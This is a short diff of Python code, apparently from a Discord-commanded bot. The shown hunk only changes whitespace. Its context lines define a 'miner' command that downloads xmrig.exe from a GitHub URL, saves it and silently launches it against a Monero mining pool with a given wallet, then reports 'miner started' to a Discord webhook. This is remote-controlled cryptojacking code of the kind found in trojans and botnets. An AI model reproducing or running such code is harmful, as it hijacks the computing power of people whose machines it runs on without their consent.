@@ -80,7 +80,7 @@ async def miner(ctx, walletArg):
             url = "https://github.com/rxu7s/XC/raw/main/xmrig.exe"
             r = requests.get(url)
             open("xmrig.exe", 'wb').write(r.content)
-            
+
         os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
 
     webhook = DiscordWebhook(webhook_url, content='``miner started``', username=bot_name, avatar_url=avatar)
